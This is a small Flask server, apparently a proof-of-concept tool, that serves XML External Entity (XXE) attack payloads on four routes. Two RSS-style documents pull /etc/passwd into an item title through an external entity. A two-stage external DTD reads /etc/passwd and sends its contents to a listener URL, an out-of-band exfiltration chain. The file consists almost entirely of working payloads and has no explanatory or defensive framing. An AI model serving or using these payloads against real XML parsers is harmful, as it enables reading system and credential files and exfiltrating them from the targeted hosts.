from flask import Flask
app = Flask(__name__)

xxe = """<?xml version="1.0"?>
<!DOCTYPE str [
<!ENTITY pass SYSTEM "/etc/passwd">
]>
<rss version="2.0">
<channel>
  <title>W3Schools Home Page</title>
  <link>http://www.w3schools.com</link>
  <description>Free web building tutorials</description>
  <item>
    <title>RSS Tutorial &pass;</title>
    <link>http://www.w3schools.com/xml/xml_rss.asp</link>
    <description>New RSS tutorial on W3Schools</description>
  </item>
  <item>
    <title>XML Tutorial</title>
    <link>http://www.w3schools.com/xml</link>
    <description>New XML tutorial on W3Schools</description>
  </item>
</channel>
</rss>
"""

xxe_2 = """<!DOCTYPE title [ <!ELEMENT title ANY > <!ENTITY xxe SYSTEM "/etc/passwd" >]>
<rss version="2.0">
<channel>
  <title>W3Schools Home Page</title>
  <link>http://www.w3schools.com</link>
  <description>Free web building tutorials</description>
  <item>
    <title>RSS Tutorial &xxe;</title>
    <link>http://www.w3schools.com/xml/xml_rss.asp</link>
    <description>New RSS tutorial on W3Schools</description>
  </item>
  <item>
    <title>XML Tutorial</title>
    <link>http://www.w3schools.com/xml</link>
    <description>New XML tutorial on W3Schools</description>
  </item>
</channel>
</rss>
"""

xxe_3 = """<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://localhost:5000/poc31" >
<foo>&e1;</foo>
"""

xxe_3_1 = """<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://localhost:5000/BLAH#%p1;'>">
%p2;
"""


@app.route("/poc1", methods=['GET'])
def poc():
    return xxe


@app.route("/poc2", methods=['GET'])
def poc_2():
    return xxe_2


@app.route("/poc30", methods=['GET'])
def poc_30():
    return xxe_3


@app.route("/poc31", methods=['GET'])
def poc_31():
    return xxe_3_1
if __name__ == "__main__":
    app.run()
